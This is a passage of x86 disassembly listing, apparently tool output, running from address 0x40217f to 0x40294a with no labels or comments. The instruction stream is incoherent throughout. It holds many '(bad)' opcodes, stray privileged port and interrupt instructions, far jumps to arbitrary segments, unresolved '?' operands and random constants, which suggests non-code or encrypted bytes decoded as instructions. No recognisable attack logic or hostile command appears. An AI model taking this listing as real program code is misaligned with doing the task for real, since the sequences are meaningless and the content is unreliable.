  40217f:	adc    BYTE PTR [eax+0x71],0xeb
  402183:	pop    esp
  402184:	scas   al,BYTE PTR es:[edi]
  402185:	jmp    0xbfad:0x409beca8
  40218c:	test   al,0x86
  40218e:	push   cs
  40218f:	cwde   
  402190:	push   edx
  402191:	bound  ebx,QWORD PTR [ebx]
  402193:	xchg   esp,eax
  402194:	mov    cl,0x7f
  402196:	arpl   WORD PTR [ebp+0x78],bp
  402199:	adc    edi,ebp
  40219b:	ins    DWORD PTR es:[edi],dx
  40219c:	fiadd  DWORD PTR [esi]
  40219e:	push   ecx
  40219f:	push   esi
  4021a0:	jge    0x402134
  4021a2:	sahf   
  4021a3:	ja     0x4021bb
  4021a5:	stc    
  4021a6:	(bad)  
  4021a7:	push   esi
  4021a8:	mov    al,ds:0xe698236d
  4021ad:	pop    edx
  4021ae:	mov    bl,0xd3
  4021b0:	jbe    0x402155
  4021b2:	in     al,dx
  4021b3:	mov    esi,0x427f44bd
  4021b8:	imul   ecx,DWORD PTR [ebx],0x6b
  4021bb:	pop    edi
  4021bc:	out    dx,al
  4021bd:	stos   DWORD PTR es:[edi],eax
  4021be:	fstp   st(1)
  4021c0:	mov    ds:0xfd03eedd,al
  4021c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c6:	sbb    ebx,DWORD PTR [esi+0x59a46e5]
  4021cc:	fdiv   QWORD PTR [ebp+0x4a0dab3]
  4021d2:	shr    BYTE PTR [ebx+0x69],cl
  4021d5:	xchg   BYTE PTR [ecx-0x38],al
  4021d8:	icebp  
  4021d9:	xchg   edi,esi
  4021db:	sahf   
  4021dc:	rol    BYTE PTR [eax-0x7d74f212],cl
  4021e2:	test   al,0x47
  4021e4:	jae    0x4021b3
  4021e6:	mov    ebp,0x1dccd4cc
  4021eb:	jns    0x4021d4
  4021ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ee:	sbb    esi,DWORD PTR [ebp+0x192dda0a]
  4021f4:	cmp    dl,BYTE PTR [edx+eax*8-0x18d9cf0c]
  4021fb:	xor    cl,BYTE PTR [esi+0x2b]
  4021fe:	fcos   
  402200:	(bad)  
  402201:	jl     0x40224d
  402203:	push   ebp
  402204:	push   ebx
  402205:	jno    0x4021f3
  402207:	adc    al,0xa0
  402209:	clc    
  40220a:	adc    eax,0xc66656ee
  40220f:	loop   0x402238
  402211:	cmp    esp,ebp
  402213:	push   esp
  402214:	lods   al,BYTE PTR ds:[esi]
  402215:	jo     0x4021d4
  402217:	nop
  402218:	add    edi,DWORD PTR fs:[eax-0x4b871826]
  40221f:	sbb    ch,BYTE PTR [ecx+edi*2+0x3c]
  402223:	dec    ecx
  402224:	mov    ah,0xee
  402226:	dec    esp
  402227:	pop    esi
  402228:	scas   al,BYTE PTR es:[edi]
  402229:	sub    dh,0x30
  40222c:	repnz lods eax,DWORD PTR ds:[esi]
  40222e:	stos   DWORD PTR es:[edi],eax
  40222f:	stos   BYTE PTR es:[edi],al
  402230:	sti    
  402231:	test   al,0xc6
  402233:	inc    edi
  402234:	xchg   esi,eax
  402235:	mov    bh,0x66
  402237:	aad    0x8
  402239:	cld    
  40223a:	in     eax,dx
  40223b:	or     dl,BYTE PTR [eax-0x23a4adfb]
  402241:	mov    ds:0x6755930c,eax
  402246:	mov    al,ds:0x22291cf3
  40224b:	int    0xef
  40224d:	mov    eax,0x710ef045
  402252:	(bad)  
  402253:	fcmovb st,st(4)
  402255:	adc    esi,DWORD PTR [ebp-0x44]
  402258:	pop    ss
  402259:	jle    0x402237
  40225b:	sbb    bl,BYTE PTR [eax+0x7f]
  40225e:	cdq    
  40225f:	jge    0x40228d
  402261:	jmp    0x5844:0x1ede8ea9
  402268:	mov    eax,0xe25d5bd0
  40226d:	adc    BYTE PTR [esi-0x36],bl
  402270:	mov    ds:0xe8e63103,eax
  402275:	out    dx,eax
  402276:	push   edi
  402277:	jns    0x4022c3
  402279:	fisub  DWORD PTR ds:0x5d233036
  40227f:	cld    
  402280:	fcom   DWORD PTR [eax]
  402282:	cmp    eax,0x91b8bcc1
  402287:	mov    ebp,0x8fcdf5c9
  40228c:	push   cs
  40228d:	adc    al,0xa1
  40228f:	ins    DWORD PTR es:[edi],dx
  402290:	outs   dx,DWORD PTR ds:[esi]
  402291:	iret   
  402292:	outs   dx,BYTE PTR ds:[esi]
  402293:	mov    cs,edi
  402295:	(bad)  
  402296:	cmp    BYTE PTR [ebx-0x61],bl
  402299:	or     al,0x96
  40229b:	stc    
  40229c:	xor    eax,0xf92acc83
  4022a1:	push   0x38b1014
  4022a6:	in     al,0xd4
  4022a8:	fs popa 
  4022aa:	imul   esp,DWORD PTR [ecx-0x18],0x424b85c2
  4022b1:	mov    WORD PTR [eax-0x601a5954],?
  4022b7:	ss or  al,bh
  4022ba:	pop    DWORD PTR [edx]
  4022bc:	out    dx,eax
  4022bd:	addr16 (bad) 
  4022bf:	push   0xcadbfd55
  4022c4:	adc    al,0xb4
  4022c6:	idiv   BYTE PTR [esi-0x10]
  4022c9:	lock or dl,BYTE PTR [ebx]
  4022cc:	fsubr  DWORD PTR ds:0xad2a8fa6
  4022d2:	jp     0x40225c
  4022d4:	mov    ds:0x2f187e32,al
  4022d9:	jp     0x4022c1
  4022db:	jmp    0x9f919088
  4022e0:	ffreep st(6)
  4022e2:	data16 sub al,0x8
  4022e5:	push   edx
  4022e6:	vpsrad ymm3,ymm4,XMMWORD PTR [ebx+0x402216ac]
  4022ee:	rcr    BYTE PTR [edx],cl
  4022f0:	cmp    al,0x66
  4022f2:	stc    
  4022f3:	xor    dh,al
  4022f5:	lock int3 
  4022f7:	repnz out 0xec,eax
  4022fa:	inc    esi
  4022fb:	retf   
  4022fc:	ja     0x402291
  4022fe:	imul   ecx,DWORD PTR [eax-0x705c26c2],0x4f
  402305:	push   ebx
  402306:	cmp    dl,BYTE PTR [eax+esi*4]
  402309:	clc    
  40230a:	add    DWORD PTR [ebx+0x36d5f904],edx
  402310:	inc    esi
  402311:	jg     0x40233a
  402313:	mov    ds:0x5e78c7e2,al
  402318:	adc    ebp,DWORD PTR [edx-0x25]
  40231b:	fist   DWORD PTR [edi+0x35]
  40231e:	cmp    al,0x71
  402320:	xchg   BYTE PTR [ecx-0xca0828c],ah
  402326:	(bad)  
  402327:	xchg   ebp,eax
  402328:	and    eax,0x87686824
  40232d:	xchg   ecx,eax
  40232e:	ja     0x4022cb
  402330:	ret    
  402331:	imul   ecx,eax,0x8
  402334:	cli    
  402335:	cmp    edi,0xffffffc9
  402338:	loop   0x402301
  40233a:	adc    ah,ch
  40233c:	adc    al,BYTE PTR [edi]
  40233e:	sbb    BYTE PTR [eax],ch
  402340:	test   DWORD PTR [esi-0x73],ecx
  402343:	(bad)  
  402344:	cmp    cl,BYTE PTR [ebx+0x110c54a7]
  40234a:	mov    esp,0x8699cd7e
  40234f:	cwde   
  402350:	sub    al,0x3b
  402352:	or     al,0x49
  402354:	mov    dh,0x1c
  402356:	mov    bl,0x81
  402358:	mov    al,ds:0x4114f07d
  40235d:	dec    esi
  40235e:	xor    eax,DWORD PTR [ecx-0x3fc42b7e]
  402364:	mov    cl,0x3c
  402366:	lahf   
  402367:	into   
  402368:	sub    ebp,DWORD PTR [ecx-0x4efef5c1]
  40236e:	je     0x402391
  402370:	adc    ecx,DWORD PTR [edi+ebp*1]
  402373:	lock mov ds:0xb6736e07,eax
  402379:	dec    ebx
  40237a:	scas   eax,DWORD PTR es:[edi]
  40237b:	jecxz  0x402372
  40237d:	test   BYTE PTR [ecx-0x4f],ah
  402380:	jb     0x402322
  402382:	and    edx,DWORD PTR [edi]
  402384:	imul   eax,ebx,0x27
  402387:	sub    bl,bl
  402389:	jne    0x402322
  40238b:	sbb    bl,BYTE PTR [ebp+0x44]
  40238e:	inc    edx
  40238f:	ins    DWORD PTR es:[edi],dx
  402390:	cmp    DWORD PTR ds:0x4afaff2a,ebx
  402396:	pop    esp
  402397:	or     edx,DWORD PTR [edi+0x49d386c7]
  40239d:	call   0x1d7881af
  4023a2:	ss cdq 
  4023a4:	pushf  
  4023a5:	jmp    0x40241c
  4023a7:	pop    eax
  4023a8:	mov    ds:0xbc4f150e,eax
  4023ad:	mov    cl,BYTE PTR [esp+ecx*2-0x47101fc6]
  4023b4:	or     eax,0x83320ac9
  4023b9:	rcl    BYTE PTR [edi+0x1f48a0ac],cl
  4023bf:	sbb    edi,eax
  4023c1:	sbb    eax,0x219fdc40
  4023c6:	cmp    DWORD PTR [eax+ecx*2],ebp
  4023c9:	pop    esi
  4023ca:	sti    
  4023cb:	pop    ecx
  4023cc:	and    DWORD PTR [ecx],ecx
  4023ce:	add    ah,al
  4023d0:	cwde   
  4023d1:	xor    eax,0xc6e720ce
  4023d6:	xchg   edi,eax
  4023d7:	inc    ecx
  4023d8:	xor    dh,BYTE PTR [esi+0x58d34804]
  4023de:	pop    esp
  4023df:	mov    WORD PTR [esi],ss
  4023e1:	lock ds iret 
  4023e4:	sbb    eax,DWORD PTR [edi]
  4023e6:	sbb    al,0x35
  4023e8:	addr16 pop edi
  4023ea:	leave  
  4023eb:	cmp    cl,BYTE PTR [edi-0x5ba9344c]
  4023f1:	xchg   edx,eax
  4023f2:	dec    ecx
  4023f3:	cwde   
  4023f4:	lock retf 0xf0d6
  4023f8:	outs   dx,WORD PTR ds:[esi]
  4023fa:	arpl   WORD PTR [edx+0x21],bx
  4023fd:	mov    ds,WORD PTR [esi-0x5bfc3ca2]
  402403:	mov    ecx,0x3fbd7bdd
  402408:	adc    eax,0x8040426d
  40240d:	nop
  40240e:	repnz mov dl,0xdd
  402411:	adc    al,dl
  402413:	daa    
  402414:	ret    0x4e1e
  402417:	(bad)  
  402418:	jmp    0x402472
  40241a:	push   ebx
  40241b:	sbb    DWORD PTR [edi+0x46],edx
  40241e:	adc    eax,0xcc353f2b
  402423:	xor    cl,BYTE PTR [edx]
  402425:	dec    ebx
  402426:	mov    ch,0xf5
  402428:	retf   
  402429:	mov    eax,ds:0x312aaff0
  40242e:	push   esi
  40242f:	retf   
  402430:	mov    BYTE PTR [ebx],cl
  402432:	push   esp
  402433:	pop    ss
  402434:	jp     0x4024b5
  402436:	int    0xb8
  402438:	sahf   
  402439:	js     0x402498
  40243b:	loopne 0x40247b
  40243d:	mov    esi,0x796730d7
  402442:	sub    DWORD PTR [edx+edx*1-0x2b],edi
  402446:	pop    edi
  402447:	push   edx
  402448:	out    0xb2,eax
  40244a:	dec    esi
  40244b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40244c:	sbb    esi,DWORD PTR [ebp+0x1f5d934e]
  402452:	(bad)  
  402453:	push   edi
  402454:	jns    0x402409
  402456:	cmp    DWORD PTR [edi+eax*2+0x33],esi
  40245a:	xor    ebp,esi
  40245c:	mov    esp,0x84a8576f
  402461:	pop    esi
  402462:	xor    DWORD PTR [ebx],edx
  402464:	retf   0x7148
  402467:	sub    ch,BYTE PTR [ebp+0x3091e249]
  40246d:	and    al,0xd3
  40246f:	jle    0x4024d0
  402471:	nop
  402472:	cmp    al,0x9c
  402474:	pop    ecx
  402476:	rol    BYTE PTR [ebp-0x7b8163c2],1
  40247c:	or     esp,ecx
  40247e:	pushf  
  40247f:	mov    al,0xf6
  402481:	ret    0x376c
  402484:	cmp    esi,edi
  402486:	scas   eax,DWORD PTR es:[edi]
  402487:	mov    ebp,DWORD PTR [eax]
  402489:	xchg   esi,eax
  40248a:	bound  edx,QWORD PTR [esi+eax*8-0x50]
  40248e:	cmp    eax,DWORD PTR [eax]
  402490:	mov    edx,0x58c4c8fe
  402495:	sub    al,0xfe
  402497:	mov    ch,0xd9
  402499:	pop    es
  40249a:	and    eax,DWORD PTR [edi]
  40249c:	and    DWORD PTR [esi+0x35],edx
  40249f:	aaa    
  4024a0:	pop    ecx
  4024a1:	imul   ecx,DWORD PTR [ebx*4+0x398d3220],0x49b62dc0
  4024ac:	aaa    
  4024ad:	dec    edi
  4024ae:	sbb    al,0xa8
  4024b0:	pop    ss
  4024b1:	pop    esi
  4024b2:	sub    dh,BYTE PTR [edx+0x3d5cae22]
  4024b8:	pop    ecx
  4024b9:	lea    ecx,[eax+0xd]
  4024bc:	(bad)  
  4024bd:	dec    ebp
  4024be:	xor    esp,DWORD PTR [ecx+0x559242ce]
  4024c4:	inc    esp
  4024c5:	cmp    ah,BYTE PTR [ecx+eax*2+0x2efb8765]
  4024cc:	cli    
  4024cd:	jbe    0x402505
  4024cf:	sahf   
  4024d0:	mov    eax,ds
  4024d2:	cmp    esp,0x17
  4024d5:	dec    edi
  4024d6:	retf   
  4024d7:	mov    dh,0x37
  4024d9:	loopne 0x402546
  4024db:	ret    0x95e4
  4024de:	idiv   edi
  4024e0:	mov    ah,0x70
  4024e2:	add    al,0x2a
  4024e4:	popa   
  4024e5:	dec    eax
  4024e6:	mov    ebx,0x6521087a
  4024eb:	pop    esp
  4024ec:	gs in  al,0x9b
  4024ef:	retf   0xd360
  4024f2:	(bad)  
  4024f3:	sar    DWORD PTR [eax+0x53],1
  4024f6:	cmp    DWORD PTR [eax-0x4a],0xf0b21e7
  4024fd:	loop   0x402524
  4024ff:	stos   DWORD PTR es:[edi],eax
  402500:	fcom   DWORD PTR gs:[eax-0xe7f4da9]
  402507:	nop
  402508:	fsub   DWORD PTR [ebx]
  40250a:	xor    BYTE PTR [eax-0x75],bl
  40250d:	(bad)  
  40250e:	enter  0x8ceb,0x97
  402512:	lock int3 
  402514:	ds xor dh,ah
  402517:	gs das 
  402519:	dec    esi
  40251a:	mov    ds:0xa8be6aff,al
  40251f:	mov    bl,0xd4
  402521:	pop    ds
  402522:	jo     0x4024be
  402524:	add    bh,ch
  402526:	add    eax,0x4f77654d
  40252b:	dec    ebp
  40252c:	(bad)  
  40252d:	xchg   ebp,eax
  40252e:	cli    
  40252f:	cwde   
  402530:	adc    esi,ebp
  402532:	popa   
  402533:	fisub  WORD PTR [eax+0x57]
  402536:	dec    esi
  402537:	int3   
  402538:	pop    ss
  402539:	mov    edi,0x3fd7557b
  40253e:	and    al,0xd5
  402540:	adc    eax,0x2fd0d7ed
  402545:	daa    
  402546:	dec    ecx
  402547:	xchg   esp,eax
  402548:	jle    0x40259c
  40254a:	pop    ss
  40254b:	imul   BYTE PTR [edx]
  40254d:	and    ecx,DWORD PTR [esi+0x6ddb2bd6]
  402553:	idiv   esp
  402555:	mov    al,ds:0xb0d58022
  40255a:	aaa    
  40255b:	int    0xb4
  40255d:	int    0xa3
  40255f:	test   DWORD PTR [eax],ecx
  402561:	out    dx,al
  402562:	nop
  402563:	(bad)
  402566:	pop    esi
  402567:	dec    ebp
  402568:	sub    edi,esi
  40256a:	pop    ecx
  40256b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256c:	mov    ds:0x4dfb1151,al
  402571:	inc    bx
  402573:	push   cs
  402574:	xchg   edx,eax
  402575:	dec    eax
  402576:	sahf   
  402577:	add    eax,0xd5a2a48a
  40257c:	stc    
  40257d:	or     DWORD PTR [ecx+0x32a2ece],esi
  402583:	or     cl,BYTE PTR [ecx-0x55]
  402586:	adc    ch,BYTE PTR [edx-0x75fc6b40]
  40258c:	test   eax,0xb213ca10
  402591:	mov    esp,0xf34bd359
  402596:	cmp    dl,BYTE PTR [ecx-0x13]
  402599:	jp     0x402557
  40259b:	inc    edi
  40259c:	jbe    0x402543
  40259e:	aam    0x4
  4025a0:	enter  0x5c0f,0x5a
  4025a4:	jg     0x402534
  4025a6:	js     0x40253e
  4025a8:	test   BYTE PTR [edi],cl
  4025aa:	mov    ah,BYTE PTR [edi]
  4025ac:	in     eax,0x49
  4025ae:	dec    eax
  4025af:	fiadd  DWORD PTR [esi-0x2b9854bb]
  4025b5:	cld    
  4025b6:	scas   eax,DWORD PTR es:[edi]
  4025b7:	pop    esp
  4025b8:	pop    esp
  4025b9:	sub    ah,bl
  4025bb:	shr    BYTE PTR [esi+ecx*2-0x20],cl
  4025bf:	subps  xmm7,XMMWORD PTR [edi-0x2]
  4025c3:	fiadd  DWORD PTR [edi]
  4025c5:	inc    ebx
  4025c6:	mov    ah,0xdf
  4025c8:	and    BYTE PTR [ebp+0x4d685719],0x1e
  4025cf:	push   ebx
  4025d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d1:	sub    BYTE PTR [eax+0x324ae924],ch
  4025d7:	js     0x402596
  4025d9:	lods   eax,DWORD PTR ds:[esi]
  4025da:	sub    BYTE PTR [ebx-0x65],cl
  4025dd:	push   esi
  4025de:	mov    ah,0x7f
  4025e0:	lock mov ah,bl
  4025e3:	push   cs
  4025e4:	neg    DWORD PTR [ebx+0x71a98a80]
  4025ea:	ret    0x712b
  4025ed:	clc    
  4025ee:	xchg   dl,dh
  4025f0:	aad    0xd8
  4025f2:	test   al,0x21
  4025f4:	jmp    0x402596
  4025f6:	cmp    BYTE PTR [ecx+0x64],ah
  4025f9:	shr    DWORD PTR [edx-0x2684872b],cl
  4025ff:	mov    al,ds:0x97e012fd
  402604:	push   0x7f
  402606:	int    0xf7
  402608:	aas    
  402609:	and    eax,ebp
  40260b:	ret    
  40260c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40260d:	dec    eax
  40260e:	xchg   ebp,eax
  40260f:	js     0x4025bd
  402611:	jno    0x4025cf
  402613:	add    eax,0x9bd4ed5d
  402618:	pushf  
  402619:	mov    esi,0x758f79b6
  40261e:	mov    esi,DWORD PTR [esi]
  402620:	and    bl,BYTE PTR [ecx-0x72]
  402623:	jle    0x40261e
  402625:	mov    bh,BYTE PTR [edx-0x24a7ab89]
  40262b:	sbb    eax,0x69f60c85
  402630:	int    0xe8
  402632:	inc    eax
  402633:	dec    ebp
  402634:	fmul   st,st(0)
  402636:	imul   BYTE PTR [esi+edi*1-0x33]
  40263a:	inc    esp
  40263b:	jl     0x4025e1
  40263d:	mov    edx,0x8b0b74e
  402642:	ret    
  402643:	ins    DWORD PTR es:[edi],dx
  402644:	mov    edi,DWORD PTR [ebx-0x321631e4]
  40264a:	dec    eax
  40264b:	sti    
  40264c:	push   eax
  40264d:	or     DWORD PTR [ecx-0xf],edx
  402650:	add    esp,DWORD PTR [ebx+eax*4-0x1c]
  402654:	shr    DWORD PTR [edx],1
  402656:	mov    edi,0xee536a2c
  40265b:	(bad)  
  40265c:	mov    al,ds:0x9df5a463
  402661:	pop    es
  402662:	popa   
  402663:	sbb    bl,bh
  402665:	sub    DWORD PTR [edx+esi*4+0x5764c6a0],esp
  40266c:	jb     0x4026a3
  40266e:	add    ch,BYTE PTR [ecx]
  402670:	out    0xfe,al
  402672:	out    0x44,eax
  402674:	jo     0x402611
  402676:	shl    BYTE PTR [ecx+0x178e2040],cl
  40267c:	aaa    
  40267d:	and    eax,0xba14d957
  402682:	shr    DWORD PTR [edx+edx*1],1
  402685:	pop    ebx
  402686:	(bad)  
  402687:	arpl   di,dx
  402689:	scas   al,BYTE PTR es:[edi]
  40268a:	aaa    
  40268b:	out    dx,eax
  40268c:	in     eax,0x19
  40268e:	cdq    
  40268f:	jecxz  0x4026e7
  402691:	loopne 0x402646
  402693:	jns    0x4026d1
  402695:	jo     0x402617
  402697:	iret   
  402698:	int3   
  402699:	push   esp
  40269a:	xchg   esp,eax
  40269b:	add    eax,esp
  40269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269e:	ret    
  40269f:	cmp    BYTE PTR [edi+0x44],0x33
  4026a3:	cmp    eax,0x59f2f052
  4026a8:	fs sbb al,0x99
  4026ab:	shl    dl,0x1b
  4026ae:	aaa    
  4026af:	iret   
  4026b0:	jb     0x4026fd
  4026b2:	jno    0x40267f
  4026b4:	jl     0x402677
  4026b6:	das    
  4026b7:	gs mov bh,0x51
  4026ba:	sbb    eax,0x4b86466a
  4026bf:	mov    edx,0x31388177
  4026c4:	(bad)  
  4026c5:	fist   WORD PTR [ebx]
  4026c7:	inc    edi
  4026c8:	je     0x4026d4
  4026ca:	xchg   cl,ah
  4026cc:	add    ecx,DWORD PTR [esi]
  4026ce:	in     al,dx
  4026cf:	sub    al,0x15
  4026d1:	sahf   
  4026d2:	loop   0x40270b
  4026d4:	cmp    al,0x2
  4026d6:	jnp    0x402744
  4026d8:	ja     0x4026cf
  4026da:	shr    DWORD PTR [ebp+0x2404dc6b],1
  4026e0:	push   ebp
  4026e1:	cmp    DWORD PTR [ebx+0x3b],esp
  4026e4:	mov    esp,edi
  4026e6:	mov    ds,WORD PTR [ebp-0xb]
  4026e9:	cdq    
  4026ea:	pop    edi
  4026eb:	inc    esi
  4026ec:	ficomp WORD PTR [eax]
  4026ee:	pop    ebx
  4026ef:	jbe    0x402767
  4026f1:	jmp    0x402758
  4026f3:	inc    edx
  4026f4:	inc    edi
  4026f5:	test   BYTE PTR ds:0x59d8de9c,dh
  4026fb:	pop    es
  4026fc:	sub    edi,DWORD PTR [ebp+0x7ca10174]
  402702:	sub    al,BYTE PTR [ecx]
  402704:	icebp  
  402705:	and    BYTE PTR fs:[edi+0x16],ch
  402709:	cmp    al,0x9
  40270b:	sbb    ebp,DWORD PTR [ebx-0x40]
  40270e:	xchg   esi,eax
  40270f:	rcr    DWORD PTR [eax],cl
  402711:	cmc    
  402712:	push   edx
  402713:	and    al,0x71
  402715:	cld    
  402716:	mov    BYTE PTR ds:0x48fdbdb4,cl
  40271c:	mov    gs,WORD PTR ds:0x500936c0
  402722:	dec    ebp
  402723:	jg     0x40278d
  402725:	cmc    
  402726:	retf   
  402727:	(bad)  
  402728:	push   0xffffffe5
  40272a:	retf   
  40272b:	sbb    DWORD PTR [esi+0x3bb5b2d0],esi
  402731:	mov    cl,0x4e
  402733:	cmp    ah,BYTE PTR [ecx+0x67]
  402736:	push   ebp
  402737:	call   0x46a0:0x4f486258
  40273e:	sub    eax,0x7c509e5
  402743:	mov    al,bh
  402745:	jecxz  0x4027c5
  402747:	aas    
  402748:	xchg   ecx,eax
  402749:	sub    al,0xeb
  40274b:	loop   0x4027ca
  40274d:	(bad)  
  40274e:	sub    eax,0x6a39d90c
  402753:	jge    0x4026e0
  402755:	jmp    0x40273c
  402757:	cwde   
  402758:	add    eax,0xd45e0941
  40275d:	pop    edx
  40275e:	or     eax,0x36b4a4f5
  402763:	xor    dl,BYTE PTR [ecx]
  402765:	inc    esp
  402766:	pushf  
  402767:	xchg   edi,eax
  402768:	nop
  402769:	ins    DWORD PTR es:[edi],dx
  40276a:	xchg   edx,eax
  40276b:	std    
  40276c:	mov    edi,0xe2e335cd
  402771:	minps  xmm0,XMMWORD PTR [esi+esi*4+0x2e]
  402776:	mov    edi,DWORD PTR [ebx+0x6a2e2371]
  40277c:	pop    es
  40277d:	fisttp QWORD PTR ds:0xc9a8e9b
  402783:	stos   DWORD PTR es:[edi],eax
  402784:	sbb    al,0x1a
  402786:	mov    edx,0xe22f2cac
  40278b:	out    0x31,eax
  40278d:	add    ch,dl
  40278f:	repnz dec esi
  402791:	pop    ds
  402792:	xor    DWORD PTR [edx],esp
  402794:	int3   
  402795:	and    bl,BYTE PTR [edx+edi*1+0x3d8b017]
  40279c:	out    0xb,eax
  40279e:	sub    bl,ch
  4027a0:	shl    DWORD PTR gs:[esi-0x55],1
  4027a4:	push   esp
  4027a5:	ds addr16 cwde 
  4027a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a9:	lods   eax,DWORD PTR ds:[esi]
  4027aa:	out    0xaf,al
  4027ac:	data16 jg 0x402742
  4027af:	cwde   
  4027b0:	pop    es
  4027b1:	xor    DWORD PTR [edx+ecx*4],edi
  4027b4:	pop    ecx
  4027b5:	sub    ebx,ebx
  4027b7:	add    ebx,ebx
  4027b9:	aas    
  4027ba:	sbb    al,0xc4
  4027bc:	pop    ss
  4027bd:	xchg   ecx,eax
  4027be:	fwait
  4027bf:	inc    ecx
  4027c0:	xchg   ebx,eax
  4027c1:	inc    DWORD PTR [eax]
  4027c3:	std    
  4027c4:	stc    
  4027c5:	inc    edx
  4027c6:	not    DWORD PTR [edi+eiz*2]
  4027c9:	and    al,0xbd
  4027cb:	fwait
  4027cc:	cmp    cl,BYTE PTR [esi-0x6bd8cb6b]
  4027d2:	js     0x402776
  4027d4:	inc    esi
  4027d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027d6:	shr    DWORD PTR [edi-0x473e2b1],1
  4027dc:	icebp  
  4027dd:	iret   
  4027de:	and    esi,ecx
  4027e0:	sbb    DWORD PTR [ebx+eiz*1-0x3af708da],ebp
  4027e7:	pop    esp
  4027e8:	xchg   esi,eax
  4027e9:	ret    0xa536
  4027ec:	mov    al,ds:0x83be37e6
  4027f1:	or     dl,cl
  4027f3:	or     DWORD PTR [edx+0xaebabe5],edx
  4027f9:	hlt    
  4027fa:	sti    
  4027fb:	pmuludq mm5,QWORD PTR [eax-0x5ace9af7]
  402802:	sub    ebp,ebp
  402804:	(bad)  
  402805:	jmp    0xce75d2cb
  40280a:	cmp    BYTE PTR [edx+esi*2+0x5ce4f4b0],ah
  402811:	dec    eax
  402812:	or     BYTE PTR [edi],ah
  402814:	add    esi,DWORD PTR [esi+0x63]
  402817:	add    al,0x15
  40281a:	push   esi
  40281b:	mov    al,ds:0x183b3335
  402820:	cld    
  402821:	mov    BYTE PTR [ebx],ah
  402823:	hlt    
  402824:	mov    ecx,0x31c06c5a
  402829:	adc    bl,bl
  40282b:	cmc    
  40282c:	cmp    ebx,DWORD PTR [ebp+edx*1-0x35cfddb9]
  402833:	lds    ebx,FWORD PTR [edi-0x4323309f]
  402839:	or     cl,BYTE PTR [edi-0x422940e0]
  40283f:	push   esp
  402840:	fist   DWORD PTR [ecx+0x4b]
  402843:	je     0x40286f
  402845:	push   ss
  402846:	psllw  mm6,QWORD PTR [eax+eax*4]
  40284a:	sub    al,0x10
  40284c:	jl     0x402828
  40284e:	mov    al,0x3d
  402850:	push   edx
  402851:	cmp    BYTE PTR [edi+0x32],bl
  402854:	shr    esp,1
  402856:	mov    esp,?
  402858:	pop    edi
  402859:	fs pop esp
  40285b:	xor    BYTE PTR [edx+0x1a],cl
  40285e:	xlat   BYTE PTR ds:[ebx]
  40285f:	lahf   
  402860:	push   ss
  402861:	mov    ?,WORD PTR [edx]
  402863:	inc    ecx
  402864:	pop    edx
  402865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402866:	xor    ah,BYTE PTR [ebx]
  402868:	iret   
  402869:	cdq    
  40286a:	sub    DWORD PTR ds:0x3622213d,ebp
  402870:	or     BYTE PTR [edi],cl
  402872:	fadd   DWORD PTR [ebx+0x6]
  402875:	loope  0x4028ac
  402877:	ret    
  402878:	or     bl,cl
  40287a:	cmp    al,0x8b
  40287c:	add    edi,DWORD PTR [ebp+edi*4-0x1]
  402880:	(bad)  
  402881:	push   esi
  402882:	or     al,0xc5
  402884:	add    BYTE PTR [esi-0x4cbf9d66],dh
  40288a:	int    0xd6
  40288c:	sub    ch,al
  40288e:	fdivr  QWORD PTR [ecx+0x45]
  402891:	push   0x2353a7c6
  402896:	mov    ebp,ss
  402898:	mov    ebp,0xde91a9e4
  40289d:	(bad)  [eax+0x1303f3c7]
  4028a3:	sub    ecx,ecx
  4028a5:	aas    
  4028a6:	xchg   edx,eax
  4028a7:	hlt    
  4028a8:	shr    cl,cl
  4028aa:	xor    al,0x79
  4028ac:	xacquire xchg DWORD PTR [edi-0x48],ecx
  4028b0:	pop    ds
  4028b1:	xchg   esp,eax
  4028b2:	jno    0x402879
  4028b4:	dec    ecx
  4028b5:	mov    ecx,eax
  4028b7:	pop    DWORD PTR [eax+0xf5e3deb]
  4028bd:	ret    0x6b05
  4028c0:	fild   QWORD PTR [eax-0x5d33ebe8]
  4028c6:	sbb    bl,BYTE PTR [esi+0x32cb2d9c]
  4028cc:	dec    edi
  4028cd:	push   esp
  4028ce:	xchg   edi,eax
  4028cf:	loopne 0x402941
  4028d1:	enter  0xca8e,0xfa
  4028d5:	lods   al,BYTE PTR ds:[esi]
  4028d6:	dec    edx
  4028d7:	lea    esp,[esi]
  4028d9:	lods   eax,DWORD PTR ds:[esi]
  4028da:	ret    
  4028db:	jnp    0x40292a
  4028dd:	out    0x18,eax
  4028df:	lods   eax,DWORD PTR ds:[esi]
  4028e0:	cld    
  4028e1:	and    al,0x60
  4028e3:	pop    ds
  4028e4:	adc    eax,0xa5f3dc97
  4028e9:	mov    ecx,0x4ad97b4
  4028ee:	(bad)  
  4028ef:	adc    DWORD PTR [edx+0x252323b9],esi
  4028f5:	fcomip st,st(3)
  4028f7:	into   
  4028f8:	ja     0x402909
  4028fa:	mov    bh,0x60
  4028fc:	lahf   
  4028fd:	das    
  4028fe:	push   ecx
  4028ff:	fild   WORD PTR [edx*4+0x351418b8]
  402906:	xchg   ebp,eax
  402907:	in     al,0xf3
  402909:	call   0xb2eda188
  40290e:	mov    gs,WORD PTR [esi+0x5d]
  402911:	loope  0x4028bb
  402913:	ror    dh,0x79
  402916:	rol    BYTE PTR [ebp+0x22],0xae
  40291a:	(bad)  
  40291b:	sub    al,0xe6
  40291d:	popa   
  40291e:	mov    WORD PTR [ebx],es
  402920:	and    eax,0x9a22face
  402926:	sti    
  402927:	mov    BYTE PTR [ebx+0x7f],ch
  40292a:	repz jmp 0xe8d2ad7d
  402930:	sbb    DWORD PTR [edi],ebp
  402932:	test   DWORD PTR [ebx-0x6a],0x837f8f8f
  402939:	and    BYTE PTR [eax+0x51],ah
  40293c:	adc    edi,edx
  40293e:	sbb    dh,BYTE PTR [ebp-0x28]
  402941:	and    BYTE PTR [ecx+0x1a],dh
  402944:	leave  
  402945:	xchg   esp,eax
  402946:	popf   
  402947:	adc    esi,edi
  402949:	into   
  40294a:	rol    BYTE PTR [ecx],1
